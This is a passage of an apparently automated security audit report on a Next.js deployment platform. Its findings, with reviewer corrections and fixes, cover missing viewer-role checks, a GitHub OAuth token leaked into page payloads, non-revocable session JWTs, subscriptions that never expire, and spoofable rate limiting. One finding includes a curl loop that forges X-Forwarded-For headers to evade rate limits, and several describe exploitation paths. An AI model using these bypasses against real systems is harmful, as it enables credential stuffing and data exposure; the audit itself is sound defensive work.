line 26 in all three routes, plus an audit log.

**Verified code:**

```ts
src/app/api/projects/[id]/deployments/[deployId]/rollback/route.ts (the entire authorization path — lines 14-44):
14:        const session = await getSession();
15:        const { id, deployId } = await params;
17:        if (!session) {
18:            return NextResponse.json({ error: 'Unauthorized' }, { status: 401, headers: securityHeaders });
19:        }
21:        const access = await checkProjectAccess(session.user.id, id);
23:        if (!access.allowed) {
24:            return NextResponse.json({ error: access.error }, { status: access.status, headers: securityHeaders });
25:        }
27:        const { project } = access;
29:        const targetDeployment = await getDeploymentById(deployId);
30:        if (!targetDeployment || targetDeployment.projectId !== id) {
31:             return NextResponse.json({ error: 'Deployment not found' }, { status: 404, headers: securityHeaders });
32:        }
34:        if (targetDeployment.status !== 'ready' || !targetDeployment.cloudRunRevision) {
35:             return NextResponse.json({ error: 'Cannot rollback to this deployment: miss
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** I hunted specifically for an existing mitigation and found none — and found strong evidence the omission is a genuine deviation from the codebase's own enforced policy.

Layers checked and ruled out as mitigations:

1. In-handler guard: `src/app/api/projects/[id]/deployments/[deployId]/rollback/route.ts` has exactly two gates before the mutation — `if (!session)` (401) and `if (!access.allowed)` (403/404). `grep -n "role"` across all three routes returns zero hits. The destructure is `const { project } = access;` — `role` is present on the success variant of the union but is never read.

2. The helper itself: `checkProjectAccess` in `src/middleware/rbac.ts` is NOT a role gate. Any team membership at all returns `{ allowed: true, project, role: membership.role }`. A `viewer` membership yields `allowed: true`. It returns the role for the caller to enforce; these routes discard it.

3. Framework/proxy layer: `src/proxy.ts` (the Next 16 middleware replacement) does rate limiting, subdomain rewriting, and security headers. Its only auth logic is a session-cookie presence check scoped to `pathname.startsWith('/dashboard') || pathname.startsWith('/new')` — API routes are explicitly not covered, and there is no role logic anywhere in the file. No wrapper, decorator, or `withRole()` HOF exists: `grep -rn "requireRole|hasPermission|canDeploy|assertRole|checkRole|ROLE_|rolePermissions" src/` returns zero matches.

4. Downstream guard: `updateTraffic` in `src/lib/gcp/cloudrun.ts:205` is a bare PATCH to the Cloud Run API with `percent: 100` on the caller-supplied revision. No authorization logic. `getProductionServiceName(project.slug)` only scopes the blast radius to the victim's own project, it does not gate the actor.

5. Type constraint: `TeamRole = 'owner' | 'admin' | 'member' | 'viewer'` (src/types/index.ts:75); `viewer` is assignable through `src/app/api/teams/[id]/invite/route.ts:56` (`validRoles` includes it), so the role is reachable by a real actor.

6. Existing test pinning safe behaviour: none. There are no API-route tests at all — every `*.test.ts` in the repo is under `src/lib/`, `src/cli/`, `src/components/`, or `src/app/edge-debug/`. Nothing exercises these handlers.

The decisive point against refutation: the codebase enforces exactly this guard in ~26 sibling routes, including the directly analogous write path. `src/app/api/projects/[id]/deploy/route.ts:44` and `:321` both do `if (access.role === 'viewer')`, as do env, storage, storage rotate/clone/export/import, and env reveal. So triggering a deployment is denied to viewers while re

</details>

### 🟡 MEDIUM — Any project member, including viewers, can flip a dashboard widget to isPublic and expose live database query results to the internet
`authn-session-8` · `src/app/api/projects/[id]/storage/dashboards/[dashboardId]/route.ts:104`

**Failure scenario.** A `viewer` (or any `member`) on a project PATCHes `/api/projects/<id>/storage/dashboards/<dashboardId>` with `{"isPublic": true}`. No role check runs. `isPublic` is the sole authorization gate on two unauthenticated endpoints: the widget metadata GET in this same file (lines 41-51 skip `getSession`/`checkProjectAccess` entirely when `widget.isPublic`) and the public query path at src/app/api/projects/[id]/storage/[storageId]/query/route.ts:45-50. Once flipped, anyone with the widget id can retrieve the widget's `query` and `storageId` and execute that query against the live production connector with no session, refreshed on the widget's `refreshInterval`. The same route's DELETE (line 143) l

**Impact.** A read-only or low-trust team member converts an internal dashboard into a permanent unauthenticated data feed out of the production database, and can destroy other members' dashboards. Combined with the query-route binding gap above, the published widget also becomes a pivot to other connectors in the project.

**Reviewer correction.** Mechanism confirmed but narrow it and note the partial mitigation. Accurate statement: the `storage_dashboards` write endpoints are the only routes in the storage/env/deploy family that omit the codebase-standard `if (access.role === 'viewer') return 403` guard. A read-only `viewer` on a project can therefore (a) PATCH `isPublic: true` onto an existing widget (dashboards/[dashboardId]/route.ts:104) and (b) POST a brand-new widget carrying an arbitrary read-only query with `isPublic: true` (dashboards/route.ts:76-93). `isPublic` is then the sole gate on two unauthenticated endpoints: the widget GET (lines 41-51 of the same file, which leaks the widget's `query` and `storageId`) and the `widgetId` branch of the query proxy (query/route.ts:35-47), which executes against the live database with no session. Two things cap the impact the finder did not account for: every `widgetId` response is passed through `maskData()` (query/route.ts:943-944), which regex-redacts emails, phones, SSNs, card numbers and `password`/`secret`/`token`/`key` fields but leaves names, addresses, amounts and arbitrary business columns intact; and lines 136-173 enforce read-only SQL, so this is disclosure only, never modification. Also, framing this as "any project member" is wrong — `member` is granted write on every sibling storage route by design; the defect is confined to the `viewer` role. Net effect: a lowest-privilege insider can republish production query results to the anonymous internet, with partial PII redaction. Fix is a one-line `if (access.role === 'viewer')` 403 in PATCH, DELETE and POST, matching storage/route.ts:75. | Directionally correct and reachable; two mechanism refinements and one mitigating factor.

(a) PATCH is not the strongest vector. POST on the parent collection (src/app/api/projects/[id]/storage/dashboards/route.ts:69-93) has the same missing role gate and writes `isPublic: !!isPublic` alongside an attacker-chosen `query` and `storageId`. A viewer does not need an existing widget to flip — they can create a brand-new public widget running any read-only SQL of their choosing and get a share URL. DELETE in the cited file (lines 130-143) is likewise ungated, so a viewer can also destroy other members' widgets.

(b) The exposed rows are not raw. src/app/api/projects/[id]/storage/[storageId]/query/route.ts:943-944 sets `const shouldMask = widgetId || access?.role === 'viewer';` and runs the response through maskData(), which regex-masks emails, phones, credit cards, SSNs, and password/secret/token/key-suffixed fields. That is shallow, pattern-based masking — arbitrary business data (revenue, internal IDs, names, addresses, free-text columns) passes through untouched — so it blunts rather than removes the exposure. The unauthenticated widget-metadata GET is NOT masked and leaks the saved query text and storageId verbatim.

(c) The read-only enforcement at lines 136-173 does hold on the public path, so this is confidentiality-only — no write/DoS-by-mutation. Aggravating factor: `isPublic` persists in Firestore after the viewer is removed from the team, so it is a durable exfiltration channel that outlives the insider's access. Medium is the right rating: it needs an invited-but-untrusted collaborator (not anonymous), and it crosses the internal-to-internet boundary persistently rather than escalating tenant privileges.

**Verified code:**

```ts
src/app/api/projects/[id]/storage/dashboards/[dashboardId]/route.ts — PATCH, no role gate:
  75	        const session = await getSession();
  76	        if (!session) {
  77	            return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
  78	        }
  79	
  80	        const { id, dashboardId } = await params;
  81	        const access = await checkProjectAccess(session.user.id, id);
  82	
  83	        if (!access.allowed) {
  84	            return NextResponse.json({ error: access.error }, { status: access.status });
  85	        }
 ...
 104	        if (isPublic !== undefined) updateData.isPublic = isPublic;
 105	        if (refreshInterval !== undefined) updateData.refreshInterval = refreshInterval;
 106	
 107	        await docRef.update(updateData);

Same file — GET skips auth entirely when isPublic:
  40	        // If not public, require session and access check
  41	        if (!widget?.isPublic) {
  42	            const session = await getSession();
  43	            if (!session) {
  44	                return NextResponse.json({ error: 'Unauthorized' }, { st
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** I hunted specifically for an existing mitigation and found none on the write side.

1) No role guard in the handler. PATCH (lines 75-85) calls only `getSession()` then `checkProjectAccess()`. `src/middleware/rbac.ts:8-34` is the only helper involved and it does NOT enforce a role — it merely *returns* one: `getTeamMembership()` (src/lib/db.ts:751-770) returns whatever membership document exists, and `checkProjectAccess` returns `{allowed: true, project, role: membership.role}` for `role: 'viewer'` exactly as it does for `owner`. `TeamRole` (src/types/index.ts:75) is `'owner' | 'admin' | 'member' | 'viewer'`, so `viewer` is a real, assignable role (src/app/api/teams/[id]/invite/route.ts:56 accepts it).

2) No framework/wrapper mitigation. `src/proxy.ts` (the Next 16 middleware replacement) applies only security headers, subdomain rewriting, and IP rate limiting to `/api/*`; its sole auth check is a cookie-presence redirect scoped to `pathname.startsWith('/dashboard') || '/new'` — it never touches `/api/projects/*`. `getSession()` (src/lib/auth.ts:88-106) is pure JWT decode, no authorization.

3) No test pins the behaviour. There are no route tests anywhere in the repo (`find -name '*.test.ts'` returns only lib/CLI/component tests); nothing references `storage_dashboards`.

4) The convention grep is the decisive evidence *against* the mitigation lens. `grep -rn "access.role" src/app/api/` shows ~18 sibling routes applying exactly the guard that is missing here — `src/app/api/projects/[id]/storage/route.ts:75,274,360`, `.../storage/[storageId]/rotate|ingest|apply-index|cutover|audit|clone|export|import/route.ts`, `.../env/route.ts:75,190`, `.../deploy/route.ts:44,321` all do `if (access.role === 'viewer') return 403`. The two dashboards route files are the only storage-family write endpoints with zero role gate. That is an omission, not an intentional design.

5) The exposure sink is real. `src/app/api/projects/[id]/storage/[storageId]/query/route.ts:35-47` takes `widgetId` and runs with **no session at all**, gated solely by `if (!widgetData?.isPublic) return 403`. And the GET in the target file (lines 41-51) skips auth entirely when `isPublic`, returning the widget doc including its `query` and `storageId`.

Where the finder overstated, and why I still don't call it refuted: there ARE two partial mitigations on the *read* side that cap impact.
 (a) query/route.ts:943-944 — `const shouldMask = widgetId || access?.role === 'viewer'; const responseData = shouldMask ? maskData(responseDataRaw) : responseDataRaw;`. Every anonymous widget fetch is

</details>

### 🟡 MEDIUM — Full Session object — including the GitHub `repo`-scope OAuth access token — is serialized into the RSC payload of every dashboard page
`authz-idor-4` · `src/app/dashboard/layout.tsx:38`  _(reviewers changed severity: high → **medium**)_

**Failure scenario.** `DashboardSidebar` is a Client Component, so Next.js App Router serializes every prop passed to it into the RSC flight payload that is inlined in the HTML response (`self.__next_f.push(...)`). The whole `Session` is passed, not just the display fields the sidebar actually reads (`session.user.avatarUrl`, `.githubUsername`, `.name`, `.subscription.tier` at lines 222-237). `Session.accessToken` is the raw GitHub OAuth token minted at src/app/api/auth/callback/route.ts:44 with scope `repo read:user user:email` (src/lib/auth.ts:176). The layout is `export const dynamic = 'force-dynamic'`, so this happens on every dashboard render. Concretely: any XSS anywhere in the dashboard, any malicious brow

**Impact.** Defeats the entire point of storing the session in an httpOnly cookie for the most sensitive credential in the system: a GitHub token that can read and write all of the user's private repositories. Any low-severity DOM XSS in the dashboard escalates straight to GitHub repo compromise.

**Reviewer correction.** Directionally correct on the mechanism, wrong on the category and one notch high on severity. The full Session — including the `repo`-scope GitHub OAuth access token — is indeed serialized into the RSC flight payload inlined in every /dashboard HTML response (verified empirically, not inferred). However this is NOT an authorization/IDOR issue: it is a client-side credential exposure that defeats the httpOnly cookie protection. Every actor receives only their own token in their own per-request response (`force-dynamic`, `revalidate = 0`); anonymous users are redirected by src/proxy.ts and hit the `if (!session)` branch at layout.tsx:22, so they get no payload at all. There is no cross-tenant path and no privilege escalation. Exploitation requires a second vector — XSS (unmitigated: no CSP exists in the codebase), a malicious browser extension, HTML disk cache on a shared machine, or HTML-capturing telemetry. Impact if chained is high, since the token grants full private-repo read/write and logout never revokes the GitHub grant, which is why this lands at medium rather than low. Fix: pass only `avatarUrl`, `githubUsername`, `name`, and `subscription.tier` to DashboardSidebar instead of the whole Session object. | The mechanism is confirmed but the category and severity are wrong. This is not an IDOR or any authorization flaw — no user ever receives another user's data; `getSession()` gates the render and each response carries only the requesting user's own token. Accurate statement: `src/app/dashboard/layout.tsx:38` passes the entire `Session` (typed as `Session` at `src/components/DashboardSidebar.tsx:31`, which makes `accessToken: string` mandatory) to a Client Component that only ever reads four display fields, so the user's raw `repo`-scope GitHub OAuth token is serialized in cleartext into the `self.__next_f.push(...)` inline script of every dashboard HTML response — verified live. The impact is a defense-in-depth failure, not a direct compromise: it converts a token protected by an `httpOnly` cookie (src/lib/auth.ts:111) into JS-readable page content on an origin with no CSP, so any XSS, malicious extension, HTML dump, or shared cache (`Cache-Control: no-cache, must-revalidate` lacks `private`/`no-store`) yields a long-lived credential with full private-repo read/write that works directly against api.github.com and is not revoked by logout. Exploitation still requires a second vulnerability, and an attacker with XSS on this origin can already drive GitHub through the app's cookie-authenticated proxy routes — which caps this at medium. The fix is trivial and worth doing: pass only `{avatarUrl, githubUsername, name, subscription}`, or wrap the value with `experimental_taintObjectReference`, and add a CSP.

**Verified code:**

```ts
1) src/app/dashboard/layout.tsx — the full session object crosses the server/client boundary:
  19:    const session = await getSession();
  22:    if (!session) {
  26:            <p ...>Redirecting to login...</p>
  38:                <DashboardSidebar session={session} />

2) src/components/DashboardSidebar.tsx — it IS a Client Component, and reads only 4 display fields:
  1:  'use client';
  31:    session: Session;
  34: export function DashboardSidebar({ session }: DashboardSidebarProps) {
  222:  <AvatarImage src={session.user.avatarUrl} alt={session.user.githubUsername} />
  228:  {session.user.name || session.user.githubUsername}
  232:  <PlanBadge tier={session.user.subscription.tier} />
  237:  @{session.user.githubUsername.toUpperCase()}

3) src/types/index.ts:366-370 — Session carries the raw token:
  366: export interface Session {
  367:     user: User;
  368:     accessToken: string;
  369:     expiresAt: number;
  370: }

4) src/lib/auth.ts:172-181 — the token is a GitHub OAuth token with `repo` scope:
  176:        scope: 'repo read:user user:email',

5) EMPIRICAL P
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** The mechanism is real and I proved it by running the app, not by reasoning about RSC: the served /dashboard HTML literally contains `\"accessToken\":\"...\"` inside a `self.__next_f.push(...)` script. So I cannot refute the core technical claim, and the finder's stated exclusions (no taint API, no sanitized session shape) both check out.

But the claim is filed as `authz-idor-4`, and on my lens — reachability by an unprivileged actor — the IDOR framing does not survive.

Anonymous actor: cannot reach it. With NODE_ENV=production and MOCK_DB unset, proxy.ts redirects cookie-less /dashboard requests to /login (401 for _rsc requests), and even if that were bypassed, getSession() returns null and layout.tsx:22 renders the minimal "Redirecting to login..." branch with no session prop and therefore no payload.

Signed-up tenant or viewer-role team member: reaches the line, but receives only their OWN accessToken inside their OWN response. The route is `dynamic = 'force-dynamic'` with `revalidate = 0`, rendered per-request from the requester's own cookie. There is no path by which user A obtains user B's token here. That is the definition of not-an-IDOR: no missing object-level authorization check, no cross-tenant boundary crossed, no privilege gained that the actor did not already have (they already hold the same token inside their own cookie).

What the bug actually is: a credential-exposure / httpOnly-bypass defect. The `repo`-scope token was previously reachable only server-side, sealed in an httpOnly cookie and inaccessible to page JavaScript; now it sits in cleartext in the HTML body of every dashboard render, readable by any script on the origin, by browser extensions, by view-source, by disk cache on a shared machine, and by any session-replay or HTML-capturing telemetry.

Severity: "high" overstates it because the defect is not independently exploitable — it requires a second vulnerability to convert into an actual compromise, and there is no remote unprivileged actor who can trigger it. It is more than "low", though, and I am not downgrading it further, because three factors genuinely aggravate the chained case: the token grants full read/write to all of the victim's private GitHub repos; there is no CSP at all, so nothing blunts an XSS that would harvest it; and logout never revokes the GitHub grant, so a harvested token is portable and effectively long-lived, surviving cookie rotation. Medium is the honest rating: real, worth fixing, chain-dependent, self-scoped.

The fix is trivial and worth stating — pass only the four fields the sid

</details>

### 🟡 MEDIUM — No session revocation whatsoever: a 7-day JWT cannot be invalidated, and logout is purely client-side
`authz-idor-7` · `src/lib/auth.ts:43`

**Failure scenario.** `createSessionToken` (src/lib/auth.ts:15-38) emits no `jti`, no session id, and no user token-version claim, and `verifySessionToken` consults nothing but the signature and the embedded `expiresAt` — there is no denylist, no Firestore session collection, and no per-user token epoch anywhere in the repo. `POST /api/auth/logout` only calls `clearSessionCookie()`, which deletes the browser cookie; the JWT itself stays valid for its full 7 days. Concretely: a user realises their token leaked (via any of the exfiltration paths above, or from `~/.deployify.json`, which the CLI writes with default 0644 permissions at src/cli/index.js:109 and which contains the same JWT in plaintext). They log out, 

**Impact.** Turns every token-disclosure bug into a guaranteed 7-day compromise window with no containment option, and makes 'sign out of all devices', per-session audit, and incident response impossible. The blast radius is amplified because the token also carries the GitHub `repo`-scope access token in its payload (src/lib/auth.ts:29), and a JWT is signed but not encrypted, so anyone holding it can also jus

**Reviewer correction.** The finding stands, but the mechanism should be stated more precisely than "no session revocation, stale JWT". Authorization state is NOT stale in this codebase: `checkProjectAccess()` (src/middleware/rbac.ts) re-reads the project and team membership from Firestore on every request, and billing routes re-read the user doc via `getUserById()`, so team removal, role demotion, and subscription downgrades all take effect immediately. The `role` and `subscription` staleness that usually accompanies this class of finding does not apply.

The actual, unmitigated gap is narrower and is exactly two things:
(1) A leaked or stolen `deployify_session` cookie cannot be killed by anyone — not the victim (logout only deletes their own browser cookie; src/app/api/auth/logout/route.ts:6-9), not an operator (no denylist, no session collection in `Collections` at src/lib/firebase.ts:256-275, no `jti`/token-version to pivot on). The only remedy is rotating `JWT_SECRET`, which signs out every user on the platform. The window is the full 7 days, and the JWT payload also carries the user's GitHub OAuth `accessToken` (`repo` scope, granted at src/lib/auth.ts:174) in base64-decodable plaintext, so the leak extends to the victim's GitHub repos.
(2) Account deletion is not a logout. `DELETE /api/user` calls `deleteUser()`, a bare user-doc delete with no cascade (src/lib/db.ts:47-50). `getSession()` never checks that the user still exists, and `checkProjectAccess` matches `project.userId === userId`, which still matches the orphaned projects. Any surviving copy of the token keeps full deploy / env-var / storage control over a deleted account's projects for up to 7 days.

Severity stays medium: exploitation presupposes a token leak, and the token is not forgeable (`config.jwt.secret` is `process.env.JWT_SECRET!` with no hardcoded fallback, src/lib/config.ts:46). Note that the CLI OAuth flow puts the session token in a URL query string — `http://localhost:${context.port}/callback?token=${sessionToken}` in src/app/api/auth/callback/route.ts — which raises the probability of the precondition leak and should be fixed alongside this. | Deployify issues stateless 7-day HS256 session JWTs with no revocation mechanism: `createSessionToken` (src/lib/auth.ts:15-38) emits no `jti`/session-id/token-version, `verifySessionToken` (src/lib/auth.ts:43-62) checks only the signature and expiry, and no denylist, session collection, or per-user token epoch exists anywhere in src/. Logout is server-side but cookie-only — `clearSessionCookie()` (src/lib/auth.ts:129-137) emits a Set-Cookie deletion; it does not invalidate the token, so a token captured before logout remains valid for the remainder of its 7 days. This is NOT an IDOR and grants no cross-tenant access: authorization is re-read from Firestore per request (`checkProjectAccess` → `getProjectById` + `getTeamMembership`, src/middleware/rbac.ts), so role changes and member removals take effect immediately, and the token's embedded `subscription` is used only for a UI badge (DashboardSidebar.tsx:230) while all entitlement enforcement re-reads the DB (billing/tiers.ts:122-124, pricing.ts:13, caps.ts). No unprivileged actor can reach this without first compromising a token by separate means. The genuine impact is the missing incident-response capability — no per-session or per-user kill switch, no "sign out all devices," with global JWT_SECRET rotation as the only remedy — plus one concrete instance: `DELETE /api/user` (src/app/api/user/route.ts:26) removes the user doc while the holder's token keeps authenticating for up to 7 days. Severity: low (defense-in-depth / IR hardening gap).

**Verified code:**

```ts
src/lib/auth.ts:15-38 — token minted with no jti / session id / token-version claim:
```
15  export async function createSessionToken(user: User, accessToken: string): Promise<string> {
16      const expiresAt = Math.floor(Date.now() / 1000) + 7 * 24 * 60 * 60; // 7 days
17
18      const token = await new SignJWT({
19          sub: user.id,
20          user: { ...
27              subscription: user.subscription,
28          },
29          accessToken,
30          expiresAt,
31      })
32          .setProtectedHeader({ alg: JWT_ALGORITHM })
33          .setIssuedAt()
34          .setExpirationTime('7d')
35          .sign(getSecret());
```

src/lib/auth.ts:43-62 — verification consults signature + embedded expiry only, no store lookup:
```
43  export async function verifySessionToken(token: string): Promise<Session | null> {
44      try {
45          const { payload } = await jwtVerify(token, getSecret(), {
46              algorithms: [JWT_ALGORITHM],
47          });
48
49          // Check if token is expired
50          if (payload.expiresAt && (payload.expiresAt as number) < Date.no
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** I hunted specifically for a missed mitigation — a wrapper, a denylist, a server-side session store, a per-request user re-validation, a framework default — and found none that closes the gap. What I found instead:

1. NO SERVER-SIDE SESSION STATE EXISTS. `Collections` in src/lib/firebase.ts:256-275 enumerates all 18 Firestore collections (USERS, PROJECTS, DEPLOYMENTS, ENV_VARS, USAGE, INVOICES, TEAMS, TEAM_MEMBERSHIPS, AUDIT_LOGS, INVITES, ANALYTICS_EVENTS, ERRORS, STORAGE_METRICS, SAVED_QUERIES, QUERY_HISTORY, QUERY_COMMENTS, SCHEMA_DOCS, DATA_LAB_AUDIT). There is no SESSIONS collection and no denylist collection. `src/app/api/auth/callback/route.ts` mints the token and sets the cookie without persisting any session record.

2. NO AUTH WRAPPER EXISTS. 76 files under src/app/api call `getSession()` directly. There is no `withAuth` helper; `requireAuth()` (src/lib/auth.ts:142) is exported but has ZERO callers (grep for `requireAuth(` returns only its own definition). So there is no single choke point where a revocation check could already be living unnoticed.

3. NO FRAMEWORK-LEVEL GUARD. src/proxy.ts (the Next 16 middleware replacement) applies security headers, subdomain rewriting and in-memory rate limiting only — it never reads or validates `deployify_session`. src/app/dashboard/layout.tsx:18 even comments "middleware already verified cookie exists", which is false; the proxy does no auth at all.

4. The real mitigations I DID find are genuine but orthogonal to revocation, and they narrow the blast radius rather than closing it:
   - `checkProjectAccess()` (src/middleware/rbac.ts) re-reads the project and calls `getTeamMembership(project.teamId, userId)` from Firestore on EVERY request. So team removal and role demotion ARE effective immediately — the stale `role` half of a typical "stale JWT" finding does not apply here.
   - Billing routes re-read the user doc (`getUserById(session.user.id)` in src/app/api/billing/usage/route.ts:19 and checkout/route.ts:68) and 404 when it is missing, so the `subscription` claim baked into the JWT is not the entitlement source of truth there.
   - The cookie is `httpOnly: true, secure: isSecure, sameSite: 'lax'` (src/lib/auth.ts:117-123), which reduces theft avenues.
   None of these can kill a token that has already leaked.

5. The claim's core assertion is verbatim true and I confirmed each part by reading the code: no `jti`, no session id, no token-version claim in `createSessionToken`; `verifySessionToken` checks only signature + embedded `expiresAt`; logout only calls `clearSessionCookie()`, which

</details>

### 🟡 MEDIUM — Paid subscriptions never expire and cancellation is ignored: writers set currentPeriodEnd but the only expiry check reads subscription.expiresAt, which nothing ever writes
`injection-db-3` · `src/lib/billing/tiers.ts:115`  _(reviewers changed severity: high → **medium**)_

**Failure scenario.** Both writers of the subscription object — src/app/api/billing/verify/route.ts:43 and src/app/api/billing/webhook/route.ts:47 — set `currentPeriodEnd: new Date(Date.now() + 30*24*60*60*1000)` and never set `expiresAt`. `grep -rn "expiresAt" src/` shows the field is only ever *read* (src/lib/db.ts:40, 867, 924, 964 and tiers.ts:115) — no code path assigns subscription.expiresAt. So the guard at tiers.ts:115 is dead: after a single one-time INR 1,500 Razorpay order (checkout creates a one-off order via createOrder, not a Razorpay recurring subscription), the user holds Pro forever. caps.getUserTier — the tier used by the only server-side quota gate at src/app/api/projects/[id]/deploy/route.ts:5

**Impact.** Every paid plan is effectively a one-time lifetime purchase: month 2 onward is 100% revenue loss, and there is no way to downgrade a delinquent or cancelled account — the quota gate keeps honoring the paid limits against platform-funded Cloud Build/Cloud Run spend.

**Reviewer correction.** Accurate restatement: subscription entitlements are never expiry-checked on any enforcement path, and the one expiry check that exists is dead code reading a field nothing writes. src/lib/billing/tiers.ts:115 tests `subscription.expiresAt`, but the only two producers of a subscription object (src/app/api/billing/verify/route.ts:39-45 and src/app/api/billing/webhook/route.ts:43-49) write `currentPeriodEnd` instead, so the branch never fires for a real user (only src/lib/auth.ts:75's dev MOCK_USER sets expiresAt). More importantly, fixing the field name would not enforce anything: `calculateTierLimits` is called only from the display-only GET src/app/api/billing/usage/route.ts:29, while the gating path — deploy/route.ts:54 → caps.ts:43 → caps.ts:37 `getTier(user.subscription?.tier)` — reads no expiry or status field at all, and `subscription.status` is written but never read anywhere in the repo. Net effect: one successful ₹1500 Razorpay order (a one-time order, not a recurring subscription) grants paid-tier quota permanently, with no renewal charge and no downgrade sweep. "Cancellation is ignored" should be dropped — there is no cancel endpoint, no cancel UI, and no `subscription.cancelled` webhook case, so cancellation is unimplemented rather than mishandled. Correct fix is to gate `getUserTier`/`getTier` on `currentPeriodEnd`/`status`, not merely to rename the field at tiers.ts:115. | Directionally correct, but the mechanism is mislocated and the severity is one notch high.

Accurate restatement: Deployify has no subscription-expiry enforcement at all, and no cancellation or refund handling. The two writers (src/app/api/billing/verify/route.ts:43, src/app/api/billing/webhook/route.ts:47) persist `currentPeriodEnd`, which has zero readers in the codebase, and the webhook's switch handles only `payment.captured` — there is no `subscription.cancelled`/`halted`/refund case, no scheduled downgrade job (the sole cron route, src/app/api/cron/optimize, is unrelated infrastructure sizing), and `subscription.status` is never consulted for gating.

The vestigial `subscription.expiresAt` comparison at src/lib/billing/tiers.ts:115 is a red herring for enforcement purposes: `calculateTierLimits` is called only from GET /api/billing/usage:29, a read-only display endpoint, and its wrapper `getUserTierLimits` (tiers.ts:122) is dead code. The actual quota gate — POST /api/projects/[id]/deploy:54 -> caps.checkUsageLimits -> caps.getUserTier (src/lib/billing/caps.ts:37-41) — reads `user.subscription?.tier` with no date or status check whatsoever. Fixing line 115 to read `currentPeriodEnd` would therefore change only the numbers displayed on the billing page while leaving the deploy gate wide open; the fix belongs in caps.getUserTier (plus a cancellation webhook case and a downgrade job).

Exploitability: not reachable by an anonymous user or a 'viewer' team member — both signature verifiers fail closed (payments.ts:53-56), and checkout's mock branch is gated on MOCK_DB==='true'. The realistic actor is a tenant who pays once and then cancels, charges back, or lapses; they retain paid quotas permanently. Impact is nonetheless unbounded on the enterprise tier, whose limits are `Infinity`: calculateLimitStatus computes n/Infinity = 0, so `withinLimits` is always true and a single payment yields permanently unmetered Cloud Build minutes and bandwidth. This is a revenue-leak/business-logic defect with real cost exposure, not a privilege-escalation or tenant-isolation vulnerability — hence medium rather than high.

**Verified code:**

```ts
src/lib/billing/tiers.ts:110-119 (the claimed location, dead guard):
  110  export function calculateTierLimits(user: User | null): TierLimits {
  111      const tierId = (user as User & { subscription?: { tier?: TierType; expiresAt?: Date } })?.subscription?.tier || 'free';
  112
  113      // Check if subscription is expired
  114      const subscription = (user as User & { subscription?: { tier?: TierType; expiresAt?: Date } })?.subscription;
  115      if (subscription?.expiresAt && subscription.expiresAt < new Date()) {
  116          return TIER_LIMITS['free'];
  117      }
  118
  119      return TIER_LIMITS[tierId];

src/app/api/billing/verify/route.ts:39-49 (writer #1 — no expiresAt, no status read later):
  39          const updatedSubscription = {
  40              tier: tierId as 'free' | 'pro' | 'team' | 'enterprise',
  41              status: 'active' as const,
  42              currentPeriodStart: new Date(),
  43              currentPeriodEnd: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000), // 30 days
  44              razorpaySubscriptionId: orderId, // Using orderI
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** MITIGATION HUNT — nothing found. I checked every place a guard could plausibly live:

1. A second expiry check elsewhere: `grep -rn "expiresAt|currentPeriodEnd|current_period_end|periodEnd" src/` returns 27 hits. Every non-subscription hit is a different feature (invite expiry src/lib/db.ts:600/609, JWT session expiry src/lib/auth.ts:16/50, API-token expiry). The ONLY subscription-expiry logic in the repo is tiers.ts:114-116. Confirmed.

2. A subscription-expiry writer: none in production code. The only assignment to `subscription.expiresAt` anywhere is src/lib/auth.ts:73-76, the hardcoded `MOCK_USER` used in MOCK_DB dev mode (`tier: 'enterprise', expiresAt: +1 year`), plus a stub in src/lib/firebase.ts:205. So the finder's "no code path assigns subscription.expiresAt" is slightly wrong (a dev mock does), but no real writer exists — the guard is dead for every real user.

3. A cron/scheduled downgrade: src/app/api/cron/ contains only `optimize/route.ts` (Cloud Run resource sizing — `upgrade|downgrade` there refers to machine specs, not billing tiers). No billing sweep job.

4. A cancellation/status guard: `grep -rni "subscription.status|past_due|canceled|unpaid"` — the union `status?: 'active'|'past_due'|'canceled'|'unpaid'` exists in src/types/index.ts:45 and is written as `'active'` by both billing writers, but NOTHING in the codebase ever READS `subscription.status`. There is no cancel endpoint (src/app/api/billing/ = checkout, invoices, usage, verify, webhook) and the webhook switch handles only `case 'payment.captured'` with an empty `default:`.

5. A test pinning safe behaviour: no tiers.test.ts exists (only invoices.test.ts in src/lib/billing/).

WHERE THE CLAIM IS OFF — two corrections that lower it from high:

(a) The claim frames tiers.ts:115 as "the only expiry check", implying enforcement would work if the field name were fixed. It would not. `calculateTierLimits` has exactly one caller: src/app/api/billing/usage/route.ts:29, a read-only GET that renders the billing page. The path that actually GATES work — POST /api/projects/[id]/deploy:54 → src/lib/billing/caps.ts:43 `checkUsageLimits` → :37 `getUserTier` → `getTier(user.subscription?.tier)` — never consults expiresAt, currentPeriodEnd, or status at all. Same for src/lib/billing/tracker.ts:144 and pricing.ts:17. So the enforcement path is expiry-blind independently of the misnamed field; renaming `expiresAt`→`currentPeriodEnd` at tiers.ts:115 would fix only the numbers displayed on the billing page, and would then make that same route self-contradictory (line 29 would show fre

</details>

### 🟡 MEDIUM — All rate limiting is per-instance in-memory keyed on a spoofable X-Forwarded-For, with stores that never shrink, and the shared `checkRateLimit` helper is dead code
`input-validation-dos-6` · `src/proxy.ts:116` · reported by 2 independent dimensions  _(reviewers changed severity: high → **medium**)_

**Failure scenario.** Three independent defects in one mechanism.
(1) Bypass: on Cloud Run the front end APPENDS the caller's IP to an existing X-Forwarded-For header rather than replacing it, so `.split(',')[0]` returns the value the ATTACKER sent. `for i in $(seq 1 100000); do curl -H "X-Forwarded-For: 1.2.3.$((RANDOM%255))" https://app/api/auth/github; done` gets a fresh 30-request bucket per header value — the 'strict' 30/min auth limit (proxy.ts:122) is nullified, as is the 20/min analytics limit at collect/route.ts:53.
(2) Multi-instance: both Maps are process-local. Cloud Run autoscales, so the effective limit is 100 x N instances and simply raising concurrency spreads a flood across instances that cannot 

**Impact.** Every rate limit in the product is bypassable with one spoofed header, which re-opens credential stuffing on /api/auth/*, unmetered analytics ingestion, and unmetered access to the expensive endpoints elsewhere in this report; the same header also drives an unauthenticated memory-exhaustion primitive against every instance.

